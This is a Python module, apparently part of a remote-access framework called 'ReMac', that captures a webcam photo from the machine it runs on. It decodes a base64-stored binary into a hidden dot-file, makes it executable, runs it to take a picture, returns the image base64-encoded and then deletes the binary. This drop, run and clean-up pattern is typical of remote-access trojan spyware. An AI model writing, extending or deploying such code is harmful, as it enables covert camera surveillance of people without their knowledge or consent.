# from modInterface import ReMacModInterface
import subprocess
import os
import base64
from PIL import Image

from modules.mod_interfaceRunCmd import mod_interfaceRunCmd


class mod_webcam(mod_interfaceRunCmd):

    def setup_mod(self):
        print(f'Module Setup (mod_webcam) called successfully!')
        pass

    # def run_command(self, command):
    #     out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    #     return out + err

    def run_mod(self):
        print(f'Webcam Module')
        content_encoding = "utf-8"
        cur_dir = os.path.abspath(".")
        print(f'{cur_dir}')
        base64ToolFile = open(f'{cur_dir}/tools/wc_tool', 'rb')
        base64ToolContent = base64ToolFile.read()

        wc_tool_bin = f"{cur_dir}/tools/.wc_tool_bin"
        wc_img = "wc_tmp.png"
        with open(wc_tool_bin, "wb") as output_file:
            output_file.write(base64.b64decode(base64ToolContent))
            self.run_command(f"chmod a+x {wc_tool_bin}")

        print(self.run_command(f'{wc_tool_bin} {wc_img}'))

        image = open(f'{wc_img}', 'rb')
        image_read = image.read()
        image_64_encode = base64.encodebytes(image_read)
        # print(f'Image-Base64: {image_64_encode}')
        answer = "Photo (webcam) taken"
        # with Image.open(wc_img) as img:
        #     img.show()
        print(answer)
        os.remove(wc_tool_bin)
        return image_64_encode